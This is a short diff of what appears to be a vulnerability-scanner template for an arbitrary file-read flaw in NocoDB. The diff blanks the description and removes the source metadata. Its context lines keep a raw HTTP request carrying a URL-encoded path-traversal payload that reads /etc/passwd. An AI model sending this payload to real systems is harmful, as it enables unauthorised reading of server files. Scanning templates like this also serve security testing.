@@ -3,12 +3,8 @@ info:
   name: NocoDB 任意文件读取漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/cptovgfgbc8xdebr'
+  description: ''
   tags: lfi,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: cptovgfgbc8xdebr
-    fofa: 暂无
 http:
 - raw:
   - 'GET /download/..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd HTTP/1.1
